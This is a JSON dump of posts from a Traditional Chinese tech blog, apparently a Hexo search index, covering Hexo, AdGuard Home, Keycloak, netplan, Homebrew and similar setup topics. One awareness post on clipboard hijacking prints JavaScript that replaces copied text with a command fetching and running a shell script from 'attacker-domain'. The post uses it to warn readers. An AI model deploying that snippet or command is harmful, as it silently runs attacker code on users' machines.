需要著修改 sitemap: ... template: ./template/sitemap.xml 測試安裝安裝完後啟動伺服器，到 http://localhost:4000/sitemap.xml 看是否有產生 sitemap.xml hexo server 產生靜態頁面也會自動產生 sitemap 檔案 hexo generate 跳過 sitemap 收錄如果有貼文或頁面想在 sitemap 中隱藏，可以在標頭 (Front-matter) 加 sitemap: false 例如： ---title: 隱藏貼文date: 2020-01-01sitemap: false---","categories":[{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/categories/Blog/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://zonego.tw/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"}]},{"title":"AdGuard Home 擋廣告工具","slug":"adguardhome","date":"2023-02-21T11:42:28.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2023/02/21/adguardhome/","link":"","permalink":"https://zonego.tw/2023/02/21/adguardhome/","excerpt":"一般檔廣告大家都會使用瀏覽器插，例如 AD Bolck。這邊推薦可以從 DNS 下手","text":"一般檔廣告大家都會使用瀏覽器插，例如 AD Bolck。這邊推薦可以從 DNS 下手 DNS 檔廣告原理DNS原理簡介一般瀏覽網站時，我們常會使用網域名稱 domain，代替只有數字的 IP 作為連線地址 舉個例子🌰，要去 google 首頁 https://www.google.com ，其中 www.google.com 就是網域名稱瀏覽器會先去 DNS 伺服器用網域名稱查出 Google 的伺服器 IP知道 IP 後才能連到 Google 的伺服器請求資料 在這中間，Google 也會順便將要顯示的廣告網址一起送回來瀏覽器再照之前的流程，去廣告商的伺服器去抓廣告回來顯示 想知道更多 DNS 詳細機制，可以參考 Coudflare 寫的說明 DNS沉洞（DNS sinkhole）看完原理後，反過來說，只要 DNS 伺服器不能正常把網域名稱換成 IP，網路就像斷了，只剩直接給 IP 的方式還能連線 所以只要在 DNS 伺服器動手腳把廣告的網址設定成錯誤的IP(例如：127.0.0.1)，廣告就無法正常顯示 這種作法就叫做 DNS沉洞（DNS sinkhole） 有幾套可以自己架的 DNS 伺服器軟體可以達到這種效果，如 PI-Hole、 AdGuard Home這邊主要介紹 AdGuard Home PI-Hole 改天在寫 AdGuard HomeAdGuard Home 官方網站 AdGuard Home GitHub repo 附上 AdGuard Home 提供的功能比對表… 功能 AdGuard Home Pi-Hole 阻擋廣告與追蹤器 ✅ ✅ 自訂阻擋清單 ✅ ✅ 內建 DHCP server 功能 ✅ ✅ HTTPS 管理介面 ✅ ❌ 需手動設定 lighttpd 上游 DNS 伺服器加密(DNS-over-HTTPS, DNS-over-TLS, DNSCrypt) ✅ ❌ (需安裝額外插件) 跨平台支援 ✅ ❌ (需透過 Docker) 支援加密DNS-over-HTTPS or DNS-over-TLS server ✅ ❌ (需安裝額外插件) 阻擋惡意網域 ✅ ❌ (需要使用另外的阻擋清單) 家長管控 (阻擋成人網站) ✅ ❌ (需自行設定阻擋清單) 強制搜尋引擎啟用安全搜尋 ✅ ❌ Per-client (device) configuration ✅ ✅ 存取設定 (設定可用 AGH DNS 的名單) ✅ ❌ [不需 root 權限][wiki-noroot]執行 ✅ ❌ 基本上我們只用擋廣告的功能，AdGuardHome 跟 Pi-Hole 選順手好用的就好雖說 AdGuard Home 有原生跨平台支援，不過真的要用也是用 Docker 去不同平台執行比較方便 安裝 AdGuard HomeLinux官方有提供 Linux 系統的自動安裝腳本 # 可以用 wget, curl 等工具下載腳本wget --no-verbose -O - https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh -s -- -v 腳本參數： -c &lt;channel&gt; 使用特定的安裝渠道，預設是從 release 安裝，可用 development edge beta release -r 重新安裝 AdGuard Home (不可與 -u 一起用) -u 移除 AdGuard Home (不可與 -r 一起用) -v 查看更多安裝時訊息 或是手動下載、安裝到 GitHub Release 下載對應 OS 的安裝檔例如安裝 Linux x64 版本 tar zxvf AdGuardHome_linux_amd64.tar.gz./AdGuardHome -s install 建議使用剛裝好系統的 VM 來裝 AdGuard Home，方便備份或是避免 port 衝突 Windows跟 Linux 手動安裝步驟相同，到 GitHub Release 下載 windows 版本後執行 DockerAdGuard Home Docker Hub docker 指令： docker run --name adguardhome\\ --restart unless-stopped\\ -v /my/own/workdir:/opt/adguardhome/work\\ -v /my/own/confdir:/opt/adguardhome/conf\\ -p 53:53/tcp -p 53:53/udp\\ -p 67:67/udp -p 68:68/udp\\ -p 80:80/tcp -p 443:443/tcp -p 443:443/udp -p 3000:3000/tcp\\ -p 853:853/tcp\\ -p 784:784/udp -p 853:853/udp -p 8853:8853/udp\\ -p 5443:5443/tcp -p 5443:5443/udp\\ -d adguard/adguardhome 其中的 Port 設定 -p 53:53/tcp -p 53:53/udp: 預設 DNS 使用 port -p 67:67/udp -p 68:68/tcp -p 68:68/udp: DHCP 使用 port (如不使用 DHCP 可以跳過) -p 3000:3000/tcp -p 443:443/tcp: AdGuard Home 的管理介面 (如不需設定 HTTPS 可以不用 443 port) -p 80:80/tcp -p 443:443/tcp -p 443:443/udp: DNS-over-HTTPS 使用 port -p 853:853/tcp: DNS-over-TLS 使用 port -p 784:784/udp -p 853:853/udp -p 8853:8853/udp: DNS-over-QUIC 使用 port (只需要設定其中一個或兩個，不需要全都用) -p 5443:5443/tcp -p 5443:5443/udp: DNSCrypt 使用 port. 如果要使用 DHCP server 的功能，建議將讓容器使用主機網路 (需注意 port 衝突) docker run --name adguardhome\\ --restart unless-stopped\\ -v /my/own/workdir:/opt/adguardhome/work\\ ... --network host -d adguard/adguardhome 設定 這邊我是在自己的電腦上用 docker 展示，連線會用 localhost 去連實際使用建議獨立裝在其他不常關的電腦或樹梅派，連線就使用 IP 連 初次設定 網路設定接下來設定監聽的網卡(透過哪張網卡能存取)，用 Docker 執行建議可以用所有介面管理員的監聽介面如果在 docker 沒有使用 80，記得設定成 3000，避免設定完就連不到DNS 伺服器監聽介面同上，建議保留預設的 53 Port 管理帳號設定設定管理員帳號密碼，建議不要用 root, admin, administor 等常見的管理帳號 用戶端設定初次設定完成，這邊可以看一下不同種類客戶端該怎麼設定使用這個 DNS 伺服器基本上只要將網路設定裡的 DNS 伺服器，改成這邊監聽的網卡的IP，就可以用 Adguard 過濾網站路由器也要套用的話，是去修改路由器的 DHCP 設定，讓子網段自動分配的 DNS 都使用我們架的 Adguard IP 初次設定完成🎉 接著可以用設定好的管理員帳號登入 設定上游 DNS 伺服器在 Adguard Home 中並不會紀錄設定之外的網域及IP的對應其他網域就需要去其他的 DNS 伺服器(上游 DNS 伺服器)查詢 Adguard Home 整理了幾個常用的 DNS 伺服器 https://adguard-dns.io/kb/zh-CN/general/dns-providers/這邊推薦可以用 Google DNS 跟 Cloudflare DNS Google DNS 協定 地址 DNS, IPv4 8.8.8.8 和 8.8.4.4 DNS, IPv6 2001:4860:4860::8888 和 2001:4860:4860::8844 DNS-over-HTTPS https://dns.google/dns-query DNS-over-TLS tls:&#x2F;&#x2F;dns.google Cloudflare DNS 協定 地址 DNS, IPv4 1.1.1.1 和 1.0.0.1 DNS, IPv6 2606:4700:4700::1111 和 2606:4700:4700::1001 DNS-over-HTTPS IPv4 https://dns.cloudflare.com/dns-query DNS-over-HTTPS IPv6 https://dns.cloudflare.com/dns-query DNS-over-TLS tls:&#x2F;&#x2F;1dot1dot1dot1.cloudflare-dns.com 過濾器設定過濾黑名單 預設黑名單Adguard Home 預設使用 Adguard 的過濾黑名單新增黑名單也很方便把想套用的黑名單加進去啟用 第三方黑名單要使用第三方黑名單只要有網址也可以匯入 這邊介紹一款專為臺灣人設計的廣告阻擋規則 LowTechFilter提供阻擋台灣常見的簡訊詐騙、釣魚網站和農場文 簡訊詐騙、釣魚網站 https://filter.futa.gg/hosts.txt 農場文 https://filter.futa.gg/nofarm_hosts.txt 手動過濾規則可以從主頁到 DNS 查詢紀錄裡去增加封鎖名單，不過缺點是之前要先查詢過 還沒有用戶端用這個 DNS 伺服器之前，紀錄會是空的 其他家長管控","categories":[{"name":"Home Lab","slug":"Home-Lab","permalink":"https://zonego.tw/categories/Home-Lab/"}],"tags":[{"name":"Self-Hosting","slug":"Self-Hosting","permalink":"https://zonego.tw/tags/Self-Hosting/"},{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"DNS","slug":"DNS","permalink":"https://zonego.tw/tags/DNS/"}]},{"title":"設定 WikiJS 使用 Keyckoak 做身分認證","slug":"wikijs-keyckoak","date":"2023-02-10T06:35:35.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2023/02/10/wikijs-keyckoak/","link":"","permalink":"https://zonego.tw/2023/02/10/wikijs-keyckoak/","excerpt":"最近在設定 WikiJS 串接 Keycloak 作身分認證時碰到一些問題，所以在這邊做個紀錄這邊就跳過安裝過程","text":"最近在設定 WikiJS 串接 Keycloak 作身分認證時碰到一些問題，所以在這邊做個紀錄這邊就跳過安裝過程 紀錄時使用版本： WikiJS 2.5.296 Keycloak 20.0.3 Keycloak 設定挑選你要設定登入的 realm ，這邊我為了不要應用程式的帳號跟 Keycloak 的管理帳號混用，建一個新的 realm 叫做 demo realm 像是用來管理帳號的群組，在這個群組內建好的應用方式都可以透過這些帳號登入 新增 client 打上 client ID (不可重複) ，next 下一步 這邊 Client authentication 必須要勾選，才會產生後面要用到的 Client Secret。點 Save 儲存 設定 client打開剛剛建好的 client wiki下滑到 Access Setting 假設我們的 wikijs 網址是 https://wiki.example.com 填入URL 說明 Root URL https://wiki.example.com 網站根網址 Home URL https://wiki.example.com 登入後重導向的根網址 (通常跟 root url 相同) Valid rediect URIs &#x2F;XXXXXXXX&#x2F;callback&#x2F;* 允許重導向頁面網址用 * 可以代表所有頁面，但要注意安全性 Valid post logout https://wiki.example.com 允許登出後轉向的頁面 redirect URIs &#x2F;* 允許登出後的重導向位置 Web origins 允許 CORS origins 的網址 Valid rediect URIs 可以在後面設定 wikijs 時取得 如果你的 Keycloak 有安裝客製主題，可以在 Login settings 裡修改 Credentials 分頁有後續會用到的 client key，可以先複製 Wikijs 設定進到設定後選認證 &gt; 新增登入機制 選擇 Keycloak 再來填入你的 Keycloak 網址、realm 名稱跟剛剛建好的 Client ID 下面4個網址可以參考 wikijs 的提示，不過左邊的 /auth 要去掉，例如： wikij 提示https://KEYCLOAK-HOST/auth/realms/YOUR-REALM/protocol/openid-connect/auth左邊的 /auth 去掉，範例的 realms 是 demohttps://your.keycloak-host.com/realms/demo/protocol/openid-connect/auth Client Secret 貼上 Keycloak Credentials 內複製的金鑰 開放自由註冊可以斟酌打開，若沒開沒登入過的帳號會無法登入 最下面可以取得 keycloak 設定需要的 Valid rediect URI只需要填 &#x2F;login&#x2F;a28088b1-8e47-4d16-aa6f-0a32d8af192f&#x2F;callback 設定完記得卷到上面點套用設定 問題排除登出時遇到 invalid parameter redirect_uri keycloak 在 18 版之後就不支援登出時使用redirect_uri參數，所以只能先暫時先把 WikiJS 的同步登出先關閉，等 WikiJS 更新 關閉後的缺點是在同一台裝置，session 未過期前，點一下 keycloak 登入就會自動登進去","categories":[{"name":"Home Lab","slug":"Home-Lab","permalink":"https://zonego.tw/categories/Home-Lab/"}],"tags":[{"name":"Self-Hosting","slug":"Self-Hosting","permalink":"https://zonego.tw/tags/Self-Hosting/"},{"name":"Wiki JS","slug":"Wiki-JS","permalink":"https://zonego.tw/tags/Wiki-JS/"},{"name":"Keyckoak","slug":"Keyckoak","permalink":"https://zonego.tw/tags/Keyckoak/"},{"name":"身分認證","slug":"身分認證","permalink":"https://zonego.tw/tags/%E8%BA%AB%E5%88%86%E8%AA%8D%E8%AD%89/"}]},{"title":"Cloudflare Page 架站教學","slug":"cloudflare-page","date":"2023-02-10T04:39:40.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2023/02/10/cloudflare-page/","link":"","permalink":"https://zonego.tw/2023/02/10/cloudflare-page/","excerpt":"Cloudflare Page 使用上跟 GitHub Page 類似就差在 GitHub Page 只能用靜態網站檔案，用框架產生的靜態網站就必須先編好才能推上去儲藏庫Cloudflare Page 可以支援編譯","text":"Cloudflare Page 使用上跟 GitHub Page 類似就差在 GitHub Page 只能用靜態網站檔案，用框架產生的靜態網站就必須先編好才能推上去儲藏庫Cloudflare Page 可以支援編譯 設定步驟官方文件 https://developers.cloudflare.com/pages/ 簡單步驟總結： 在 GitHub 或 GitLab 建立網頁用的儲藏庫 (repository) Cloudflare page 連結 GitHub 或 GitLab 在 Cloudflare 設定網站用的 domain name 完成🎉 設定 Git 儲藏庫首先到 GitHub 或 GitLab 建立網頁用的儲藏庫 (就基本的 git 操作，這邊就不多作教學) 網站內容跟 GitHub Page 一樣，只要是靜態網站都可以，不管是直接寫或是用框架產生都可以比 GitHub Page 好的一點是，可以直接推送框架的程式上去，部署時編譯 (但免費版有限制) GitHub Page 跟 Cloudflare page 也不需要太糾結要用哪個，反正都免費都可以先用看看例如本網站的內容就是用 Hexo 框架產生，先推送到 GitHub Page，Cloudflare page 用同個儲藏庫當來源 在 https://zonelin.github.io/ 也可以找到本站 Cloudflare 新增 page 專案登入 Cloudflare 在 page 設定內新增一個專案 登入 GitHub 或 GitLab 選擇要用的存儲庫 repository 設定要觸發抓取的分支 (建議把部署跟開發中做不同的分支) 如果是想要推送後，再用框架產生靜態網頁可以調整這邊設定 點儲存部屬 Save and Deploy 後會開始從 Git 存儲庫抓程式碼下來編譯如果是靜態頁面，就只有抓下來 (畢竟我們的 Build setting 是空的)完成會自動給一個自動分配的網址，例如本站就是 blog-public-3io.pages.dev 需要自訂網址可以到專案的 Custom domains 設定，免費版有使用上限 免費版限制 到這邊就完成了🎉 用 Cloudflare 還有個好處，Cloudflare 會自動套 Web Analytics 免費版使用限制根據官方文件 每個帳號可以件幾個網站專案、預覽板本好像沒限制 建置免費版能從 GitHub 抓程式碼重新建置每個月500次，建置時間不得過20分鐘推送程式碼到 GitHub 也會觸發重新建置 所以我習慣在本機把 hexo 建制好，再推送到 GitHub，省編譯時間 Domains最多 10 個自訂 domain 檔案單一個網站專案，最多到 2 萬個檔案單一檔案、素材最大 25MB 有放圖片要注意下容量 Headers最多 100 header 規則 重導向規則最多 100 個","categories":[{"name":"Home Lab","slug":"Home-Lab","permalink":"https://zonego.tw/categories/Home-Lab/"}],"tags":[{"name":"網站架設","slug":"網站架設","permalink":"https://zonego.tw/tags/%E7%B6%B2%E7%AB%99%E6%9E%B6%E8%A8%AD/"},{"name":"Cloudflare","slug":"Cloudflare","permalink":"https://zonego.tw/tags/Cloudflare/"},{"name":"靜態網站","slug":"靜態網站","permalink":"https://zonego.tw/tags/%E9%9D%9C%E6%85%8B%E7%B6%B2%E7%AB%99/"},{"name":"Git","slug":"Git","permalink":"https://zonego.tw/tags/Git/"}]},{"title":"Hitomi Downloader","slug":"hitomi-downloader","date":"2023-01-19T02:59:09.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2023/01/19/hitomi-downloader/","link":"","permalink":"https://zonego.tw/2023/01/19/hitomi-downloader/","excerpt":"","text":"Hitomi Downloader 是一個開源的影音下載工具，支援各大網站的影音下載 目前只有 windows 的版本 GitHub https://github.com/KurtBestor/Hitomi-Downloader下載位置 https://github.com/KurtBestor/Hitomi-Downloader/releases 詳細支援網站請看 https://github.com/KurtBestor/Hitomi-Downloader#supported-sites 除了 Youtube 等影音網站還支援 Pixiv Hitomi Downloader 底層用 youtube-dl 的分支專案 yt-dlp 作為影音下載器yt-dlp 支援的網站，Hitomi Downloader 基本就能下載 套個官方的示範圖","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"}]},{"title":"Ubuntu 22.04 設定網路連線","slug":"ubuntu22-netsetting","date":"2022-12-25T10:44:10.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2022/12/25/ubuntu22-netsetting/","link":"","permalink":"https://zonego.tw/2022/12/25/ubuntu22-netsetting/","excerpt":"","text":"Ubuntu 20.04 後改用 netplan 作為指令網路設定工具 設定檔netplan 設定檔預設放在 /etc/netplan/00-installer-config.yaml 修改及套用需要 root 權限 查看網卡代號ip addr 跑出來的結果像這樣 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: ens18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether xx:xx:xx:xx:xx:xx brd xx:xx:xx:xx:xx:xx altname enp0s18 inet 192.168.1.xx/24 brd 172.16.0.255 scope global ens18 valid_lft forever preferred_lft forever inet6 0000::0000:0000:0000:0000/64 scope link valid_lft forever preferred_lft forever 編號 2 後面的 ens18 就是網卡代號 我的電腦只有裝一張網卡結果才會只到編號 2，如果有多張網卡會接續列在下面 接下來就是開始編輯設定檔 使用 nano 編輯器修改設定檔 nano /etc/netplan/50-cloud-init.yaml 使用 DHCP 自動設定 IPnetwork: version: 2 renderer: networkd ethernets: # 下面 ens18 改成你的網卡代號 ens18: dhcp4: true # 如果有多張網卡，設定繼續加在下面 設定固定 IPnetwork: version: 2 ethernets: ens18: addresses: # 設定固定 IP - 192.168.1.2/24 # 預設閘道器 gateway4: 192.168.1.1 # 預設 DNS nameservers: addresses: [8.8.8.8, 1.1.1.1] 固定 IP 中 /24 代表子網遮罩，相當於 255.255.255.0 如果不會換算，可以參考 IPv4 子網計算機 https://damaha-labo.site/converter/zh-Hant/IT/CalcSubnetMask 通常沒特殊需求的話，家用路由器的子網遮罩都是用 /24 255.255.255.0 在 ubuntu 22.04 新版的 Netplan 中， gateway4 這個設定已被棄用 新版的設定檔長這樣 network: version: 2 ethernets: ens18: addresses: # 設定固定 IP - 192.168.1.2/24 # 預設 DNS nameservers: addresses: [8.8.8.8, 1.1.1.1] # 預設閘道器 routes: - to: default via: 192.168.1.1 預設路由的設定，改成可以設定多個預設閘道器(Gateway) routes: - to: default via: 10.0.0.1 metric: 200 - to: default via: 11.0.0.1 metric: 300 其中 metric 代表優先權重，值越小越優先使用 設定 WIFI 連線取得 Wifi 網卡代號$ ls /sys/class/netenp0s25 lo wlp3s0 通常在 Ubuntu 22.04 中 Wifi 網卡代號通常是 wlan0 或是 wlp3s0 在設定檔下面加上 Wifi 的部分即可 network: ethernets: eth0: dhcp4: true optional: true version: 2 wifis: wlp3s0: optional: true access-points: &quot;SSID-NAME-HERE&quot;: password: &quot;PASSWORD-HERE&quot; dhcp4: true 至於要怎麼找附近可用的熱點… 保存、套用設定範例使用的 nano 編輯器，儲存按法：Ctrl + X -&gt; Y 保存完後，用下面指令測試設定檔有無格式錯誤 netplan try 確定網路沒問題，在 120 秒內按 Enter 確定套用。這招可以避免設定固定 IP 時設定錯誤斷網，畢竟很懶的跑去機器旁邊重新設定。 如果想要直接套用，不用再另外檢查，可以用 netplan apply 檢查是否設定成功 ip addr 看一下網卡有沒有配到 IP 如果你的 Raspberry Pi 也是裝 Ubuntu，網路設定也是這樣修改 參考資料Netplan 設定範例 https://netplan.io/examples","categories":[{"name":"系統設定","slug":"系統設定","permalink":"https://zonego.tw/categories/%E7%B3%BB%E7%B5%B1%E8%A8%AD%E5%AE%9A/"}],"tags":[{"name":"網路","slug":"網路","permalink":"https://zonego.tw/tags/%E7%B6%B2%E8%B7%AF/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://zonego.tw/tags/Ubuntu/"}]},{"title":"Hexo 設定 404 頁面","slug":"hexo-404-page","date":"2022-12-21T02:56:21.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2022/12/21/hexo-404-page/","link":"","permalink":"https://zonego.tw/2022/12/21/hexo-404-page/","excerpt":"404 頁面，也就是找不到網頁時的暫時頁面。雖然大部分網頁伺服器已經提供預設的 404 頁面，但公版有些蠻醜的。","text":"404 頁面，也就是找不到網頁時的暫時頁面。雖然大部分網頁伺服器已經提供預設的 404 頁面，但公版有些蠻醜的。 新增頁面方法一：使用 md 檔讓 Hexo 生成簡單省事的做法就是在 source 資料夾內新增 404.md ，依照一般貼文的寫法，寫完讓 Hexo 產生頁面就好。 方法二：使用一般 html 檔事先準備好 404.html 的靜態網頁，放到 source 資料夾內。 例如使用範本 https://freefrontend.com/html-css-404-page-templates/ 放入後修改 _config.yml 設定跳渲染 404.html (可參考 Hexo 指定文件跳過渲染) ...skip_render:- 404.html 一般檔案如 css 與 js 可以直接放著在 source 就好，Hexo 渲染網頁時會回直接搬到 public 資料夾內。 套用 404 頁面我們的網站有提供 404 頁面，但設定重導向就是網頁伺服器的工作了。 靜態網頁服務GitHub Page, CloudFlare Page 等免費的靜態網站服務，預設都會抓 source 資料夾下的 404.html 檔案作為 404 頁面。 nginx預設網站設定檔通常是 /etc/nginx/conf.d/default.conf # The default server.server &#123; listen 80 default_server; server_name everythingelse; error_page 404 /404.html; # Everything is a 404 location / &#123; return 404; #return the code 404 &#125; # link the code to the file location = /404.html &#123; # 可以把頁面位置改成這樣，Hexo 部署時的對應位置就是 public 資料夾 root /var/www/nginx/www/; &#125;&#125; apache在網站資料夾內的 /var/www/html/.htaccess 檔案內加入 ErrorDocument 404 /404.html 或是編輯 /etc/apache2/sites-enabled/000-default.com 修改 VirtualHost &lt;VirtualHost&gt; ... ErrorDocument 404 /404.html ...&lt;/VirtualHost&gt; 關於 SEO Google, Bing 等搜尋引擎，會將較合適的網站優先推到搜尋結果上。為了讓排名靠前一些， SEO（搜尋引擎優化）就變得十分重要，尤其是要增加曝光度。SEO 其中一項是需使用自訂的 404 頁面，也因此網站就會影響到網站的廣告費。 參考資料github page 404 settingapache custum 404 pagenginx 404 page","categories":[{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/categories/Blog/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://zonego.tw/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"}]},{"title":"linux 環境變數及 Path 設定","slug":"linux-path","date":"2022-11-29T12:02:04.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2022/11/29/linux-path/","link":"","permalink":"https://zonego.tw/2022/11/29/linux-path/","excerpt":"Linux 環境變數種類 永久的：需要修改配置檔案，變數永久生效。 臨時的：使用export命令宣告即可，變數在關閉shell或關機時失效。","text":"Linux 環境變數種類 永久的：需要修改配置檔案，變數永久生效。 臨時的：使用export命令宣告即可，變數在關閉shell或關機時失效。 Mac 跟 Linux 都是由 Unix 發展的作業系統，在部分操作邏輯都相同，包含環境變數。 看目前的環境變數# 使用 env 指令env XXXX@MacBook-Pro blog % envUSER=XXXXSECURITYSESSIONID=186adCOMMAND_MODE=unix2003HOME=/Users/XXXXXXSHELL=/bin/zsh... 如果已知環境變數的名稱，可以使用 echo 查看 # 查看環境變數 SHELLXXXX@MacBook-Pro blog % echo $SHELL/bin/zsh 設定環境變數臨時性修改，重開機後就必須再做一次用 export 指令 # 設定 PATH 變數為例export PATH=&quot;$PATH&quot;:/home/binexport PATH=$&#123;PATH&#125;:/home/bin 輸入之後可以使用export指令來查看環境變數是否有輸入進去。 永久性修改，需重開機之後才會有作用修改 profileprofile的路徑是在 “&#x2F;etc&#x2F;profile”，打開後在裡面加入 export PATH=&quot;$PATH&quot;:/home/bin# 或是export PATH=$&#123;PATH&#125;:/home/bin 修改.bashrc.bashrc的路徑是在”&#x2F;home&#x2F;danny&#x2F;.bashrc”，在檔案最後面加入 export PATH=&quot;$PATH&quot;:/home/bin# 或是export PATH=$&#123;PATH&#125;:/home/bin 參考來源 阿輝的零碎筆記 Linux環境變數的設定、檢視、刪除","categories":[{"name":"系統設定","slug":"系統設定","permalink":"https://zonego.tw/categories/%E7%B3%BB%E7%B5%B1%E8%A8%AD%E5%AE%9A/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"},{"name":"環境變數","slug":"環境變數","permalink":"https://zonego.tw/tags/%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/"}]},{"title":"Mac 上的套件管理系統 Homebrew","slug":"homebrew","date":"2022-10-24T09:59:16.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2022/10/24/homebrew/","link":"","permalink":"https://zonego.tw/2022/10/24/homebrew/","excerpt":"","text":"HomebrewHomebrew 是 Mac 上常用的第三方套件管理器，可以用來安裝 wget 等 Linux 常用但 Mac 沒有的程式。雖然主要是面向 Mac 的程式，但 Linux 也可以用。 安裝官方有提供安裝腳本 # Homebrew 安裝腳本/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot; 不需要用 sudo 安裝 裝完之後可以用 brew help 檢查是否安裝成功 使用方法xxxx@MacBook-Pro ~ % brew helpExample usage: brew search TEXT|/REGEX/ brew info [FORMULA|CASK...] brew install FORMULA|CASK... brew update brew upgrade [FORMULA|CASK...] brew uninstall FORMULA|CASK... brew list [FORMULA|CASK...]Troubleshooting: brew config brew doctor brew install --verbose --debug FORMULA|CASKContributing: brew create URL [--no-fetch] brew edit [FORMULA|CASK...]Further help: brew commands brew help [COMMAND] man brew https://docs.brew.sh # 例如安裝 wgetbrew install wget 其他更多用法參考官網 https://brew.sh/index_zh-tw (有中文) 安裝問題如果下載途中意外中斷 (例如 Mac 休眠自動斷線) ，重跑時可能會出現下面問題 error: Not a valid ref: refs/remotes/origin/masterfatal: ambiguous argument &#x27;refs/remotes/origin/master&#x27;: unknown revision or path not in the working tree. 碰到這個問題，只要先把舊的刪掉再重裝就可以了 # Homebrew 刪除腳本/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)&quot;","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"},{"name":"套件管理","slug":"套件管理","permalink":"https://zonego.tw/tags/%E5%A5%97%E4%BB%B6%E7%AE%A1%E7%90%86/"}]},{"title":"Apple Silicon MAC上的虛擬機軟體","slug":"UTM-virtual-machine","date":"2022-10-05T01:07:13.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2022/10/05/UTM-virtual-machine/","link":"","permalink":"https://zonego.tw/2022/10/05/UTM-virtual-machine/","excerpt":"","text":"相信在用 MAC 的大家或多或少都會遇到要用 Windows 專用軟體的情況。 稍微在網路上爬過比較多人推薦的是 Parallel Desktop ，可惜它是付費軟體。 VMWare 到今天只有推了一個測試版的 Fusion Player ，害我都已經想用 PC + 遠桌面解決了。 還好閒逛時找到這套 UTM 虛擬機 官網 https://mac.getutm.app/ 介面有中文，只要有用過虛擬機的朋友，一定能簡單上手。絕對不是因為我懶得寫 UTM 的底層是用 QEMU ，代表在MAC上的虛擬機跑膩了，還可以簡單移植硬碟檔到 Proxmox VE 上執行。 不得不說 M1 MAC 的續航力實在是太香了。 更新，在 MAC 上用虛擬機還是非常噴電，大概只有用遠端桌面能解決了","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"},{"name":"Apple Silicon","slug":"Apple-Silicon","permalink":"https://zonego.tw/tags/Apple-Silicon/"},{"name":"VM 虛擬機","slug":"VM-虛擬機","permalink":"https://zonego.tw/tags/VM-%E8%99%9B%E6%93%AC%E6%A9%9F/"}]},{"title":"注意複製貼上內容","slug":"copy-past","date":"2022-04-27T11:44:03.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2022/04/27/copy-past/","link":"","permalink":"https://zonego.tw/2022/04/27/copy-past/","excerpt":"","text":"注意複製貼上內容我們經常會從網路上複製資料，但在貼上之前先注意下你複製到甚麼內容! 複製這個指令試試看 sudo apt update document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\\n'); e.preventDefault(); }); 把剛剛複製的貼這邊 中間的奧秘就是用 JavaScript 達到改寫複製的內容 document.getElementById(&#x27;copy&#x27;).addEventListener(&#x27;copy&#x27;, function(e) &#123; e.clipboardData.setData(&#x27;text/plain&#x27;, &#x27;curl http://attacker-domain:8000/shell.sh | sh\\n&#x27;); e.preventDefault(); &#125;); 所以，在貼上之前記得先貼到記事本檢查，不要直接貼到終端機使用 來源https://www.wizer-training.com/blog/copy-paste","categories":[{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/categories/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"}],"tags":[{"name":"資安","slug":"資安","permalink":"https://zonego.tw/tags/%E8%B3%87%E5%AE%89/"},{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/tags/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"}]},{"title":"youtube-dl 登入並下載影片","slug":"youtube-dl-login","date":"2022-04-10T08:39:57.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2022/04/10/youtube-dl-login/","link":"","permalink":"https://zonego.tw/2022/04/10/youtube-dl-login/","excerpt":"","text":"↩️回總教學文帳號密碼登入某些內容會指定必須要認證身分(登入)後，才能觀看這種情況下， 